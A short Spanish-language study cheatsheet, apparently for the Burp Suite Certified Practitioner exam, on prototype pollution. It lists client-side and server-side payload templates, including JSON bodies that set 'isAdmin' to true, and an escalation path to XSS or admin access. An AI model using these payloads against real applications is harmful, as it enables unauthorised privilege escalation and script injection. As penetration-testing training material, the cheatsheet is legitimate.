---
tipo: cheatsheet
vuln: prototype-pollution
tags: [bscp, tipo/cheatsheet, vuln/prototype-pollution]
relacionada: "[[Prototype-Pollution]]"
---

# CS · Prototype Pollution

## Flujo repetible
1. Contamina el prototipo con una propiedad de prueba.
2. Busca un gadget que el código lea y encadena impacto.

## Detección
```
Contamina una propiedad de prueba y comprueba en consola: Object.prototype.{{COL}}
```

## Plantillas de payload
```
# Cliente (DOM) — usa DOM Invader
?__proto__[{{COL}}]={{val}}
constructor.prototype.{{COL}}={{val}}
```
```json
// Servidor (JSON body)
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

## Escalada al objetivo
Gadget de prototipo → XSS en cliente o elevación (isAdmin) en servidor → acceso admin.

## Checklist
- [ ] Contaminé el prototipo
- [ ] Encontré un gadget explotable

## Referencias
- https://portswigger.net/web-security/prototype-pollution
